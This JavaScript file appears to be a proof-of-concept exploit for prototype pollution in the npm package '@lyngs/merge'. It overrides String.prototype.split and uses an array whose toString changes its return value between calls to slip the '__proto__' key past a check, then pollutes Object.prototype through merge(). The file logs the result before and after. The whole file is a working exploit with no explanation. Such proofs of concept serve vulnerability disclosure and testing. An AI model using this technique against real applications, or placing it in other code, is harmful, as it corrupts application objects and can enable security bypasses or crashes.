var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const {merge} = require('@lyngs/merge');
console.log({}.polluted);
merge({ dummy: 1 }, JSON.parse(`{"__proto__":{"polluted":"yes"}}`));
console.log({}.polluted);